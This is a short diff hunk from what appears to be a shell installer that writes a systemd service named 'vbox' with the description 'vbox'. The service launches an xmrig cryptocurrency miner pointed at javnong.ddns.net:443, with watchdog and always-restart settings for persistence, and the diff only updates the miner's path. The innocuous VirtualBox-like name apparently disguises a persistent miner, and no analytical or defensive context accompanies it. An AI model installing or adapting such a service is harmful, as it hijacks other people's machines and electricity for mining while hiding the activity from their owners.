@@ -12,7 +12,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/vbox.service
 Description=vbox
 After=network.target
 [Service]
-ExecStart= /usr/local/src/xml/miner/xmrigDaemon --donate-level 1 --donate-over-proxy 1 -o javnong.ddns.net:443 -k --tls
+ExecStart= /usr/local/src/miner/xmrigDaemon --donate-level 1 --donate-over-proxy 1 -o javnong.ddns.net:443 -k --tls
 WatchdogSec=300
 Restart=always
 RestartSec=60
